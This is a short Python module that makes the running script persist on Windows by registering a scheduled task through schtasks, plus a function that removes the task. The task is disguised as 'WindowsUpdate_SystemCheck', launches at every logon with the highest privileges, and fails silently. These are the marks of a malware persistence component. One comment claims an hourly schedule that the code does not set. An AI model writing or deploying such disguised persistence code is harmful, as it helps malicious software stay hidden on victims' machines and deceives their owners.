import os
import subprocess
import sys

def enable_persistence():
    try:
        # Get path of current executable/script
        exe_path = os.path.abspath(sys.argv[0])
        task_name = "WindowsUpdate_SystemCheck"
        
        # XML content for task scheduler
        # We use a simple schtasks command for maximum compatibility
        # Runs at every logon and every 1 hour
        
        # First, ensure we don't have duplicate tasks
        subprocess.run(['schtasks', '/delete', '/tn', task_name, '/f'], capture_output=True)
        
        # Create task: /sc ONLOGON -> Runs when user logs in
        # /rl HIGHEST -> Highest privileges
        # /f -> Force creation
        subprocess.run([
            'schtasks', '/create', '/tn', task_name, '/tr', exe_path,
            '/sc', 'ONLOGON', '/rl', 'HIGHEST', '/f'
        ], capture_output=True)
        
        return True
    except:
        return False

def disable_persistence():
    try:
        task_name = "WindowsUpdate_SystemCheck"
        subprocess.run(['schtasks', '/delete', '/tn', task_name, '/f'], capture_output=True)
        return True
    except:
        return False